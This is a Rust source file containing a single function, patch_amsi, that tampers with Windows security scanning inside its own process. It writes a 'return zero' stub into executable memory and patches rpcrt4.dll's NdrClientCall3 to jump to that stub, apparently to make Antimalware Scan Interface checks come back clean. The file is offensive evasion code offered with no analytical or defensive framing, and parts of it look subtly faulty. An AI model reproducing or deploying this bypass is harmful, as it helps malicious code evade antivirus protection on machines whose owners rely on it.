use std::ffi::c_void;

use windows::Win32::System::{LibraryLoader::{GetProcAddress, LoadLibraryA}, Memory::{VirtualAlloc, VirtualAllocEx, VirtualProtect, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE}, Threading::GetCurrentProcess};
use windows_core::s;

pub fn patch_amsi() {
    let phandle = unsafe { GetCurrentProcess() }; 
    
    let trampoline_ptr = unsafe { 
        VirtualAllocEx(
            phandle, 
            None, 
            0x6, 
            MEM_COMMIT | MEM_RESERVE, 
            PAGE_EXECUTE_READWRITE,
        ) 
    };

    if trampoline_ptr.is_null() {
        eprintln!("malloc error.");
        return;
    }

    println!("trampoline: {:x?}", trampoline_ptr);
    // mov eax, 0
    // ret
    let trampoline: [u8; 6] = [0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3];

    unsafe {
        std::ptr::copy_nonoverlapping(trampoline.as_ptr(), trampoline_ptr as *mut u8, trampoline.len());
    }

    let hmodule = unsafe { LoadLibraryA(s!("rpcrt4.dll")).unwrap() };
    let addr = unsafe { GetProcAddress(hmodule, s!("NdrClientCall3")).unwrap()} ;
    let target_ptr = addr as *const c_void;

    let patch: Vec<u8> = vec![
        vec![0x48, 0xb8],
        trampoline_ptr.addr().to_le_bytes().to_vec(),
        vec![0xff, 0xe0],
    ].into_iter().flatten().collect();

    let old_protect = std::ptr::null_mut();
    unsafe {
        VirtualProtectEx(
            phandle, 
            target_ptr, 
            patch.len(), 
            PAGE_EXECUTE_READWRITE, 
            old_protect,
        ).unwrap();

        std::ptr::copy_nonoverlapping(patch.as_slice().as_ptr(), target_ptr as *mut u8, patch.len());
    }

}